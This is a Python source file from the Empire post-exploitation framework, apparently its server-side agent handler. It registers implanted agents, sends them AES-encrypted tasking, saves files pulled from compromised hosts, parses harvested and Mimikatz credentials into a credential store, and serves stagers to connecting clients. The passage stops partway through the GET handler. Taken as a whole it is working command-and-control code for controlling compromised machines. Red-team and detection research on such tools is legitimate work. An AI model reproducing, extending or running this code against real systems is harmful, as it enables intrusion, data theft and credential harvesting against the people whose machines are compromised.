"""

Main agent handling functionality for Empire.

Database methods related to agents, as well as
the GET and POST handlers (process_get() and process_post()) ^
used to process checkin and result requests.

handle_agent_response() is where the packets are parsed and
the response types are handled as appropriate.

"""

import string
import os
import json
from pydispatch import dispatcher

# Empire imports
import encryption
import helpers
import http
import packets
import messages


class Agents:
    """
    Main class that contains agent handling functionality, including key
    negotiation in process_get() and process_post().
    """
    def __init__(self, MainMenu, args=None):

        # pull out the controller objects
        self.mainMenu = MainMenu
        self.conn = MainMenu.conn
        self.listeners = None
        self.modules = None
        self.stager = None
        self.installPath = self.mainMenu.installPath

        self.args = args

        # internal agent dictionary for the client's session key, funcions, and URI sets
        #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
        #   self.agents[sessionID] = {  'sessionKey' : clientSessionKey,
        #                               'functions' : [tab-completable function names for a script-import],
        #                               'currentURIs' : [current URIs used by the client],
        #                               'oldURIs' : [old URIs used by the client]
        #                            }
        self.agents = {}

        # reinitialize any agents that already exist in the database
        agentIDs = self.get_agent_ids()
        for agentID in agentIDs:
            self.agents[agentID] = {}
            self.agents[agentID]['sessionKey'] = self.get_agent_session_key(agentID)
            self.agents[agentID]['functions'] = self.get_agent_functions_database(agentID)

            # get the current and previous URIs for tasking
            currentURIs, oldURIs = self.get_agent_uris(agentID)
            self.agents[agentID]['currentURIs'] = currentURIs.split(',')

            if not oldURIs:
                self.agents[agentID]['oldURIs'] = []
            else:
                self.agents[agentID]['oldURIs'] = oldURIs.split(',')

        # pull out common configs from the main menu object in empire.py
        self.ipWhiteList = self.mainMenu.ipWhiteList
        self.ipBlackList = self.mainMenu.ipBlackList
        self.stage0 = self.mainMenu.stage0
        self.stage1 = self.mainMenu.stage1
        self.stage2 = self.mainMenu.stage2

    ###############################################################
    #
    # Misc agent methods
    #
    ###############################################################

    def remove_agent(self, sessionID):
        """
        Remove an agent to the internal cache and database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        # remove the agent from the internal cache
        self.agents.pop(sessionID, None)

        # remove the agent from the database
        cur = self.conn.cursor()
        cur.execute("DELETE FROM agents WHERE session_id LIKE ?", [sessionID])
        cur.close()


    def add_agent(self, sessionID, externalIP, delay, jitter, profile, killDate, workingHours, lostLimit):
        """
        Add an agent to the internal cache and database.
        """

        cur = self.conn.cursor()

        currentTime = helpers.get_datetime()
        checkinTime = currentTime
        lastSeenTime = currentTime

        # generate a new key for this agent
        session_key = encryption.generate_aes_key()

        # config defaults, just in case something doesn't parse
        #   ...we shouldn't ever hit this...
        requestUris = "post.php"
        userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        additionalHeaders = ""

        # profile format ->     requestUris|user_agent|additionalHeaders
        parts = profile.split("|")
        if len(parts) == 2:
            requestUris = parts[0]
            userAgent = parts[1]
        elif len(parts) > 2:
            requestUris = parts[0]
            userAgent = parts[1]
            additionalHeaders = "|".join(parts[2:])

        cur.execute("INSERT INTO agents (name,session_id,delay,jitter,external_ip,session_key,checkin_time,lastseen_time,uris,user_agent,headers,kill_date,working_hours,lost_limit) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (sessionID, sessionID, delay, jitter, externalIP, session_key, checkinTime, lastSeenTime, requestUris, userAgent, additionalHeaders, killDate, workingHours, lostLimit))
        cur.close()

        # initialize the tasking/result buffers along with the client session key
        session_key = self.get_agent_session_key(sessionID)

        self.agents[sessionID] = {'sessionKey': session_key, 'functions': [], 'currentURIs': requestUris.split(','), 'oldURIs': []}

        # report the initial checkin in the reporting database
        cur = self.conn.cursor()
        cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (sessionID, "checkin", checkinTime, helpers.get_datetime()))
        cur.close()


    def is_agent_present(self, sessionID):
        """
        Check if the sessionID is currently in the cache.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        return sessionID in self.agents


    def is_uri_present(self, resource):
        """
        Check if the resource is currently in the uris or old_uris for any agent.
        """

        for option, values in self.agents.iteritems():
            if resource in values['currentURIs'] or resource in values['oldURIs']:
                return True
        return False


    def is_ip_allowed(self, ip_address):
        """
        Check if the ip_address meshes with the whitelist/blacklist, if set.
        """

        if self.ipBlackList:
            if self.ipWhiteList:
                return ip_address in self.ipWhiteList and ip_address not in self.ipBlackList
            else:
                return ip_address not in self.ipBlackList
        if self.ipWhiteList:
            return ip_address in self.ipWhiteList
        else:
            return True


    def save_file(self, sessionID, path, data, append=False):
        """
        Save a file download for an agent to the appropriately constructed path.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_name(sessionID)
        if nameid:
            sessionID = nameid

        parts = path.split("\\")

        # construct the appropriate save path
        save_path = "%s/downloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = parts[-1]

        # fix for 'skywalker' exploit by @zeroSteiner
        safePath = os.path.abspath("%s/downloads/%s/" % (self.installPath, sessionID))
        if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
            dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (sessionID), sender="Agents")
            dispatcher.send("[!] attempted overwrite of %s with data %s" % (path, data), sender="Agents")
            return

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(save_path):
            os.makedirs(save_path)

        # overwrite an existing file
        if not append:
            f = open("%s/%s" % (save_path, filename), 'wb')
        else:
            # otherwise append
            f = open("%s/%s" % (save_path, filename), 'ab')

        f.write(data)
        f.close()

        # notify everyone that the file was downloaded
        dispatcher.send("[+] Part of file %s from %s saved" % (filename, sessionID), sender="Agents")


    def save_module_file(self, sessionID, path, data):
        """
        Save a module output file to the appropriate path.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_name(sessionID)
        if nameid:
            sessionID = nameid

        parts = path.split("/")
        # construct the appropriate save path
        # save_path = self.installPath + "/downloads/"+str(sessionID)+"/" + "/".join(parts[0:-1])
        save_path = "%s/downloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = parts[-1]

        # fix for 'skywalker' exploit by @zeroSteiner
        safePath = os.path.abspath("%s/downloads/%s/" % (self.installPath, sessionID))
        if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
            dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (sessionID), sender="Agents")
            dispatcher.send("[!] attempted overwrite of %s with data %s" % (path, data), sender="Agents")
            return

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(save_path):
            os.makedirs(save_path)

        # save the file out
        f = open(save_path + "/" + filename, 'w')
        f.write(data)
        f.close()

        # notify everyone that the file was downloaded
        # dispatcher.send("[+] File "+path+" from "+str(sessionID)+" saved", sender="Agents")
        dispatcher.send("[+] File %s from %s saved" % (path, sessionID), sender="Agents")

        return "/downloads/%s/%s/%s" % (sessionID, "/".join(parts[0:-1]), filename)


    def save_agent_log(self, sessionID, data):
        """
        Save the agent console output to the agent's log file.
        """

        name = self.get_agent_name(sessionID)

        save_path = self.installPath + "/downloads/" + str(name) + "/"

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(save_path):
            os.makedirs(save_path)

        current_time = helpers.get_datetime()

        f = open(save_path + "/agent.log", 'a')
        f.write("\n" + current_time + " : " + "\n")
        f.write(data + "\n")
        f.close()


    ###############################################################
    #
    # Methods to get information from agent fields.
    #
    ###############################################################

    def get_agents(self):
        """
        Return all active agents from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT * FROM agents")
        results = cur.fetchall()
        cur.close()
        return results


    def get_agent_names(self):
        """
        Return all names of active agents from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT name FROM agents")
        results = cur.fetchall()
        cur.close()
        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in results]
        return results


    def get_agent_ids(self):
        """
        Return all IDs of active agents from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT session_id FROM agents")
        results = cur.fetchall()
        cur.close()
        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in results]
        return results


    def get_agent(self, sessionID):
        """
        Return complete information for the specified agent from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT * FROM agents WHERE session_id=?", [sessionID])
        agent = cur.fetchone()
        cur.close()
        return agent


    def get_agent_internal_ip(self, sessionID):
        """
        Return the internal IP for the agent from the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT internal_ip FROM agents WHERE session_id=?", [sessionID])
        agent = cur.fetchone()
        cur.close()
        return agent


    def is_agent_elevated(self, sessionID):
        """
        Check whether a specific sessionID is currently elevated.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT high_integrity FROM agents WHERE session_id=?", [sessionID])
        elevated = cur.fetchone()
        cur.close()

        if elevated is not None and elevated != ():
            return int(elevated[0]) == 1
        else:
            return False


    def get_ps_version(self, sessionID):
        """
        Return the current PowerShell version for this agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT ps_version FROM agents WHERE session_id=?", [sessionID])
        ps_version = cur.fetchone()
        cur.close()

        if ps_version is not None:
            if isinstance(ps_version, str):
                return ps_version
            else:
                return ps_version[0]


    def get_agent_session_key(self, sessionID):
        """
        Return AES session key for this sessionID.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT session_key FROM agents WHERE session_id=?", [sessionID])
        sessionKey = cur.fetchone()
        cur.close()

        if sessionKey is not None:
            if isinstance(sessionKey, str):
                return sessionKey
            else:
                return sessionKey[0]


    def get_agent_results(self, sessionID):
        """
        Return agent results from the backend database.
        """

        agent_name = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent %s not active." % (agent_name))
        else:
            cur = self.conn.cursor()
            cur.execute("SELECT results FROM agents WHERE session_id=?", [sessionID])
            results = cur.fetchone()

            cur.execute("UPDATE agents SET results = ? WHERE session_id=?", ['', sessionID])

            if results and results[0] and results[0] != '':
                out = json.loads(results[0])
                if out:
                    return "\n".join(out)
            else:
                return ''
            cur.close()


    def get_agent_id(self, name):
        """
        Get an agent sessionID based on the name.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT session_id FROM agents WHERE name=?", [name])
        results = cur.fetchone()
        if results:
            return results[0]
        else:
            return None


    def get_agent_name(self, sessionID):
        """
        Get an agent name based on sessionID.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT name FROM agents WHERE session_id=? or name = ?", [sessionID, sessionID])
        results = cur.fetchone()
        if results:
            return results[0]
        else:
            return None


    def get_agent_hostname(self, sessionID):
        """
        Get an agent's hostname based on sessionID.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT hostname FROM agents WHERE session_id=? or name = ?", [sessionID, sessionID])
        results = cur.fetchone()
        if results:
            return results[0]
        else:
            return None


    def get_agent_functions(self, sessionID):
        """
        Get the tab-completable functions for an agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID in self.agents:
            return self.agents[sessionID]['functions']
        else:
            return []


    def get_agent_functions_database(self, sessionID):
        """
        Get the tab-completable functions for an agent from the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT functions FROM agents WHERE session_id=?", [sessionID])
        functions = cur.fetchone()[0]
        cur.close()
        if functions is not None:
            return functions.split(",")
        else:
            return []


    def get_agent_uris(self, sessionID):
        """
        Get the current and old URIs for an agent from the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT uris, old_uris FROM agents WHERE session_id=?", [sessionID])
        uris = cur.fetchone()
        cur.close()

        return uris


    def get_autoruns(self):
        """
        Get any global script autoruns.
        """

        try:
            cur = self.conn.cursor()
            cur.execute("SELECT autorun_command FROM config")
            results = cur.fetchone()
            if results:
                autorun_command = results[0]
            else:
                autorun_command = ''

            cur = self.conn.cursor()
            cur.execute("SELECT autorun_data FROM config")
            results = cur.fetchone()
            if results:
                autorun_data = results[0]
            else:
                autorun_data = ''
            cur.close()

            return [autorun_command, autorun_data]
        except Exception:
            pass


    ###############################################################
    #
    # Methods to update agent information fields.
    #
    ###############################################################

    def update_agent_results(self, sessionID, results):
        """
        Update the internal agent result cache.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID in self.agents:
            cur = self.conn.cursor()

            # get existing agent results
            cur.execute("SELECT results FROM agents WHERE session_id LIKE ?", [sessionID])
            agent_results = cur.fetchone()

            if agent_results and agent_results[0]:
                agent_results = json.loads(agent_results[0])
            else:
                agent_results = []

            agent_results.append(results)

            cur.execute("UPDATE agents SET results = ? WHERE session_id=?", [json.dumps(agent_results), sessionID])
            cur.close()
        else:
            dispatcher.send("[!] Non-existent agent " + str(sessionID) + " returned results", sender="Agents")


    def update_agent_sysinfo(self, sessionID, listener="", external_ip="", internal_ip="", username="", hostname="", os_details="", high_integrity=0, process_name="", process_id="", ps_version=""):
        """
        Update an agent's system information.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET listener = ?, internal_ip = ?, username = ?, hostname = ?, os_details = ?, high_integrity = ?, process_name = ?, process_id = ?, ps_version = ? WHERE session_id=?", [listener, internal_ip, username, hostname, os_details, high_integrity, process_name, process_id, ps_version, sessionID])
        cur.close()


    def update_agent_lastseen(self, sessionID):
        """
        Update the agent's last seen timestamp.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        current_time = helpers.get_datetime()
        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET lastseen_time=? WHERE session_id=?", [current_time, sessionID])
        cur.close()


    def update_agent_profile(self, sessionID, profile):
        """
        Update the agent's "uri1,uri2,...|useragent|headers" profile.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        parts = profile.strip("\"").split("|")
        cur = self.conn.cursor()

        # get the existing URIs from the agent and save them to
        #   the old_uris field, so we can ensure that it can check in
        #   to get the new URI tasking... bootstrapping problem :)
        cur.execute("SELECT uris FROM agents WHERE session_id=?", [sessionID])
        old_uris = cur.fetchone()[0]

        if sessionID not in self.agents:
            print helpers.color("[!] Agent %s not active." % (nameid))
        else:
            # update the URIs in the cache
            self.agents[sessionID]['oldURIs'] = old_uris.split(',')
            self.agents[sessionID]['currentURIs'] = parts[0].split(',')

        # if no additional headers
        if len(parts) == 2:
            cur.execute("UPDATE agents SET uris=?, user_agent=?, old_uris=? WHERE session_id=?", [parts[0], parts[1], old_uris, sessionID])
        else:
            # if additional headers
            cur.execute("UPDATE agents SET uris=?, user_agent=?, headers=?, old_uris=? WHERE session_id=?", [parts[0], parts[1], parts[2], old_uris, sessionID])

        cur.close()


    def rename_agent(self, oldname, newname):
        """
        Update the agent's last seen timestamp.
        """

        if not newname.isalnum():
            print helpers.color("[!] Only alphanumeric characters allowed for names.")
            return False

        # rename the logging/downloads folder
        old_path = "%s/downloads/%s/" % (self.installPath, oldname)
        new_path = "%s/downloads/%s/" % (self.installPath, newname)

        # check if the folder is already used
        if os.path.exists(new_path):
            print helpers.color("[!] Name already used by current or past agent.")
            return False
        else:
            # signal in the log that we've renamed the agent
            self.save_agent_log(oldname, "[*] Agent renamed from %s to %s" % (oldname, newname))

            # move the old folder path to the new one
            if os.path.exists(old_path):
                os.rename(old_path, new_path)

            # rename the agent in the database
            cur = self.conn.cursor()
            cur.execute("UPDATE agents SET name=? WHERE name=?", [newname, oldname])
            cur.close()

            # report the agent rename in the reporting database
            cur = self.conn.cursor()
            cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (oldname, "rename", newname, helpers.get_datetime()))
            cur.close()

            return True


    def set_agent_field(self, field, value, sessionID):
        """
        Set field:value for a particular sessionID.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET " + str(field) + "=? WHERE session_id=?", [value, sessionID])
        cur.close()


    def set_agent_functions(self, sessionID, functions):
        """
        Set the tab-completable functions for the agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID in self.agents:
            self.agents[sessionID]['functions'] = functions

        functions = ",".join(functions)

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET functions=? WHERE session_id=?", [functions, sessionID])
        cur.close()


    def set_autoruns(self, taskCommand, moduleData):
        """
        Set the global script autorun in the config.
        """

        try:
            cur = self.conn.cursor()
            cur.execute("UPDATE config SET autorun_command=?", [taskCommand])
            cur.execute("UPDATE config SET autorun_data=?", [moduleData])
            cur.close()
        except Exception:
            print helpers.color("[!] Error: script autoruns not a database field, run ./setup_database.py to reset DB schema.")
            print helpers.color("[!] Warning: this will reset ALL agent connections!")


    def clear_autoruns(self):
        """
        Clear the currently set global script autoruns in the config.
        """

        try:
            cur = self.conn.cursor()
            cur.execute("UPDATE config SET autorun_command=''")
            cur.execute("UPDATE config SET autorun_data=''")
            cur.close()
        except Exception:
            print helpers.color("[!] Error: script autoruns not a database field, run ./setup_database.py to reset DB schema.")
            print helpers.color("[!] Warning: this will reset ALL agent connections!")


    ###############################################################
    #
    # Agent tasking methods
    #
    ###############################################################

    def add_agent_task(self, sessionID, taskName, task="" ):
        """
        Add a task to the specified agent's buffer.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent " + str(agentName) + " not active.")
        else:
            if sessionID:

                dispatcher.send("[*] Tasked " + str(sessionID) + " to run " + str(taskName), sender="Agents")

                # get existing agent taskings
                cur = self.conn.cursor()
                cur.execute("SELECT taskings FROM agents WHERE session_id=?", [sessionID])
                agent_tasks = cur.fetchone()

                if agent_tasks and agent_tasks[0]:
                    agent_tasks = json.loads(agent_tasks[0])
                else:
                    agent_tasks = []

                #create a new result
                taskID = cur.execute("INSERT INTO results (agent, result) VALUES(?, '')", [sessionID]).lastrowid

                # append our new json-ified task and update the backend
                agent_tasks.append([taskName, task, taskID])
                cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", [json.dumps(agent_tasks), sessionID])

                # write out the last tasked script to "LastTask.ps1" if in debug mode
                if self.args and self.args.debug:
                    f = open('%s/LastTask.ps1' % (self.installPath), 'w')
                    f.write(task)
                    f.close()


                # report the agent tasking in the reporting database
                cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp, taskID) VALUES (?,?,?,?,?)", (sessionID, "task", taskName + " - " + task[0:50], helpers.get_datetime(), taskID))
                cur.close()
                return taskID

    def get_agent_tasks(self, sessionID):
        """
        Retrieve tasks for our agent.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent " + str(agentName) + " not active.")
            return []
        else:

            cur = self.conn.cursor()
            cur.execute("SELECT taskings FROM agents WHERE session_id=?", [sessionID])
            tasks = cur.fetchone()

            if tasks and tasks[0]:
                tasks = json.loads(tasks[0])

                # clear the taskings out
                cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", ['', sessionID])
            else:
                tasks = []

            cur.close()

            return tasks


    def clear_agent_tasks(self, sessionID):
        """
        Clear out one (or all) agent's task buffer.
        """

        if sessionID.lower() == "all":
            sessionID = '%'

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET taskings=? WHERE session_id LIKE ?", ['', sessionID])
        cur.close()


    def handle_agent_response(self, sessionID, responseName, taskID, data):
        """
        Handle the result packet based on sessionID and responseName.
        """

        agentSessionID = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_name(sessionID)
        if nameid:
            sessionID = nameid

        # report the agent result in the reporting database
        cur = self.conn.cursor()
        cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp, taskID) VALUES (?,?,?,?,?)", (agentSessionID, "result", responseName, helpers.get_datetime(), taskID))
        cur.close()

        #insert task results into the database, ignore agent errors
        if taskID!=0:

            #if the result isn't a file, insert into the database 
            if responseName not in ["TASK_DOWNLOAD", "TASK_CMD_JOB_SAVE", "TASK_CMD_WAIT_SAVE"]:
                cur = self.conn.cursor()
                cur.execute("UPDATE results set result=result||? where id=?", [data, taskID])
                cur.close()

        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if responseName == "ERROR":
            # error code
            dispatcher.send("[!] Received error response from " + str(sessionID), sender="Agents")
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, "[!] Error response: " + data)


        elif responseName == "TASK_SYSINFO":
            # sys info response -> update the host info
            parts = data.split("|")
            if len(parts) < 10:
                dispatcher.send("[!] Invalid sysinfo response from " + str(sessionID), sender="Agents")
            else:
                # extract appropriate system information
                listener = parts[0].encode('ascii', 'ignore')
                domainname = parts[1].encode('ascii', 'ignore')
                username = parts[2].encode('ascii', 'ignore')
                hostname = parts[3].encode('ascii', 'ignore')
                internal_ip = parts[4].encode('ascii', 'ignore')
                os_details = parts[5].encode('ascii', 'ignore')
                high_integrity = parts[6].encode('ascii', 'ignore')
                process_name = parts[7].encode('ascii', 'ignore')
                process_id = parts[8].encode('ascii', 'ignore')
                ps_version = parts[9].encode('ascii', 'ignore')

                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

                # username = str(domainname)+"\\"+str(username)
                username = "%s\\%s" % (domainname, username)

                # update the agent with this new information
                self.update_agent_sysinfo(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, ps_version=ps_version)

                sysinfo = '{0: <18}'.format("Listener:") + listener + "\n"
                sysinfo += '{0: <18}'.format("Internal IP:") + internal_ip + "\n"
                sysinfo += '{0: <18}'.format("Username:") + username + "\n"
                sysinfo += '{0: <18}'.format("Hostname:") + hostname + "\n"
                sysinfo += '{0: <18}'.format("OS:") + os_details + "\n"
                sysinfo += '{0: <18}'.format("High Integrity:") + str(high_integrity) + "\n"
                sysinfo += '{0: <18}'.format("Process Name:") + process_name + "\n"
                sysinfo += '{0: <18}'.format("Process ID:") + process_id + "\n"
                sysinfo += '{0: <18}'.format("PSVersion:") + ps_version

                self.update_agent_results(sessionID, sysinfo)
                # update the agent log
                self.save_agent_log(sessionID, sysinfo)


        elif responseName == "TASK_EXIT":
            # exit command response

            # let everyone know this agent exited
            dispatcher.send(data, sender="Agents")

            # update the agent results and log
            # self.update_agent_results(sessionID, data)
            self.save_agent_log(sessionID, data)

            # remove this agent from the cache/database
            self.remove_agent(sessionID)


        elif responseName == "TASK_SHELL":
            # shell command response
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_DOWNLOAD":
            # file download
            parts = data.split("|")
            if len(parts) != 3:
                dispatcher.send("[!] Received invalid file download response from " + sessionID, sender="Agents")
            else:
                index, path, data = parts
                # decode the file data and save it off as appropriate
                file_data = helpers.decode_base64(data)
                name = self.get_agent_name(sessionID)

                if index == "0":
                    self.save_file(name, path, file_data)
                else:
                    self.save_file(name, path, file_data, append=True)
                # update the agent log
                msg = "file download: %s, part: %s" % (path, index)
                self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_UPLOAD":
            pass


        elif responseName == "TASK_GETJOBS":

            if not data or data.strip().strip() == "":
                data = "[*] No active jobs"

            # running jobs
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_STOPJOB":
            # job kill response
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT":

            # dynamic script output -> blocking
            self.update_agent_results(sessionID, data)

            # see if there are any credentials to parse
            time = helpers.get_datetime()
            creds = helpers.parse_credentials(data)

            if creds:
                for cred in creds:

                    hostname = cred[4]

                    if hostname == "":
                        hostname = self.get_agent_hostname(sessionID)

                    self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, cred[5], time)

            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT_SAVE":
            # dynamic script output -> blocking, save data
            name = self.get_agent_name(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (prefix, self.get_agent_hostname(sessionID), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.update_agent_results(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_CMD_JOB":

            # dynamic script output -> non-blocking
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

            # TODO: redo this regex for really large AD dumps
            #   so a ton of data isn't kept in memory...?
            parts = data.split("\n")
            if len(parts) > 10:
                time = helpers.get_datetime()
                if parts[0].startswith("Hostname:"):
                    # if we get Invoke-Mimikatz output, try to parse it and add
                    #   it to the internal credential store

                    # cred format: (credType, domain, username, password, hostname, sid, notes)
                    creds = helpers.parse_mimikatz(data)

                    for cred in creds:
                        hostname = cred[4]

                        if hostname == "":
                            hostname = self.get_agent_hostname(sessionID)

                        self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, cred[5], time)


        elif responseName == "TASK_CMD_JOB_SAVE":
            # dynamic script output -> non-blocking, save data
            name = self.get_agent_name(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (prefix, self.get_agent_hostname(sessionID), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.update_agent_results(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_SCRIPT_IMPORT":
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_SCRIPT_COMMAND":
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        else:
            print helpers.color("[!] Unknown response %s from %s" % (responseName, sessionID))


    ###############################################################
    #
    # HTTP processing handlers
    #
    ###############################################################

    def process_get(self, port, clientIP, sessionID, resource):
        """
        Process a GET request.
        """

        # check to make sure this IP is allowed
        if not self.is_ip_allowed(clientIP):
            # dispatcher.send("[!] "+str(resource)+" requested by "+str(clientIP)+" on the blacklist/not on the whitelist.", sender="Agents")
            dispatcher.send("[!] %s requested by %s on the blacklist/not on the whitelist." % (resource, clientIP), sender="Agents")
            return (200, http.default_page())

        # see if the requested resource is in our valid task URI list
        if self.is_uri_present(resource):

            # if no session ID was supplied
            if not sessionID or sessionID == "":
                dispatcher.send("[!] %s requested by %s with no session ID." % (resource, clientIP), sender="Agents")
                # return a 404 error code and no resource
                return (404, "")

            # if the sessionID doesn't exist in the cache
            # TODO: put this code before the URI present? ...
            if not self.is_agent_present(sessionID):
                dispatcher.send("[!] %s requested by %s with invalid session ID." % (resource, clientIP), sender="Agents")
                return (404, "")

            # if the ID is currently in the cache, see if there's tasking for the agent
            else:

                # update the client's last seen time
                self.update_agent_lastseen(sessionID)

                # retrieve all agent taskings from the cache
                taskings = self.get_agent_tasks(sessionID)

                if taskings and taskings != []:

                    all_task_packets = ""

                    # build tasking packets for everything we have
                    for tasking in taskings:
                        task_name, task_data, res_id = tasking

                        # if there is tasking, build a tasking packet
                        all_task_packets += packets.build_task_packet(task_name, task_data, res_id)

                    # get the session key for the agent
                    session_key = self.agents[sessionID]['sessionKey']

                    # encrypt the tasking packets with the agent's session key
                    encrypted_data = encryption.aes_encrypt_then_mac(session_key, all_task_packets)

                    return (200, encrypted_data)

                # if no tasking for the agent
                else:
                    # just return the default page
                    return (200, http.default_page())

        # step 1 of negotiation -> client requests stage1 (stager.ps1)
        elif resource.lstrip("/").split("?")[0] == self.stage0:
            # return 200/valid and the initial stage code

            if self.args and self.args.debug:
                dispatcher.send("[*] Sending stager (stage 1) to %s" % (clientIP), sender="Agents")

            # get the staging information for the given listener, keyed by port
            #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,istener_type,redirect_target,lost_limit
            config = self.listeners.get_staging_information(port=port)
            host = config[0]
            stagingkey = config[3]
            profile = config[6]
            stage = None

            # if we have a pivot or hop listener, use that config information instead for the stager
            if "?" in resource:
                parts = resource.split("?")
                if len(parts) == 2:
                    decoded = helpers.decode_base64(parts[1])

                    # http://server:port for a pivot listener
